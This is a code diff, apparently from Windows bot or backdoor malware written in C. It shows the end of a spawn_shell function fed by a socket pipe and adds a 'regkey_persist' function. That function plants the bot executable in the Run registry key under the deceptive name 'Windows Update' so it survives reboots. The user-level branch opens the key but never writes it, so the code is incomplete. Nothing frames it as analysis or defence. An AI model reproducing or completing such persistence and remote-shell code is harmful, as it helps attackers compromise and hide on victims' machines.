@@ -26,3 +26,31 @@ void spawn_shell(HANDLE sock_pipe)
   CloseHandle(pi.hProcess);
   CloseHandle(pi.hThread);
 }
+
+
+/* 
+ *                         -- Currently Developing --
+ */
+
+/* attempts to add the bot executable to a startup run key, either as admin or user.
+   returns 0 if admin, 1 if user, and 2 if failed. */
+int regkey_persist(char *bot_path)
+{
+  char *admin_key= "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+  char *user_key=  "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+  char *key_name= "Windows Update";
+  HKEY hkey;
+  LSTATUS status;
+  int result= 0;
+
+  status= RegOpenKeyEx(HKEY_LOCAL_MACHINE, admin_key, 0, KEY_ALL_ACCESS, &hkey);
+
+  if (status == ERROR_SUCCESS) /* admin access */
+    RegSetValueEx(hkey, key_name, 0, REG_SZ, (LPBYTE)bot_path, MAX_PATH);
+  else { /* no admin access */
+    status= RegOpenKeyEx(HKEY_CURRENT_USER, user_key, 0, KEY_ALL_ACCESS, &hkey);
+    result= (status == ERROR_SUCCESS) ? 1 : 2;
+  }
+      
+  return result;
+}
